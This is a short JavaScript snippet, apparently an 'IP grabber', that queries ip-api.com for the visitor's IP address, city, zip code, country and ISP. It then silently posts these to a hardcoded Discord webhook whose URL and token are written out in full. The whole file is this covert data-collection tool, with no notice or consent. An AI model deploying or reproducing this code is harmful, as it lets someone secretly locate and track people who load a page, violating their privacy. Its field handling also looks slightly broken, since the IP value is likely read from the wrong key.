var ip = '';
var city = '';
var zip = '';
var country = '';
var isp = '';

fetch('http://ip-api.com/json/?fields=61439')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;         // Get IP
    city = data.city;     // Get City
    zip = data.zip;       // Get Zip Code
    country = data.country; // Get Country
    isp = data.isp;       // Get ISP

    // Discord webhook URL
    var webhook = 'https://discord.com/api/webhooks/1298428290675245158/eY6I-zzFlWKgM15QY8glgGWkpQaVuTh1v4aE1dsZeumqpislhvbarKIXzjOZIZiDSv_m';
    
    // Prepare message
    var message = {
      content: 'IP: ' + ip + '\nCity: ' + city + '\nCountry: ' + country + '\nZip Code: ' + zip + '\nISP: ' + isp
    };

    // Send message to Discord
    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  })
  .catch(function(error) {
    console.error('Error fetching data:', error);
  });
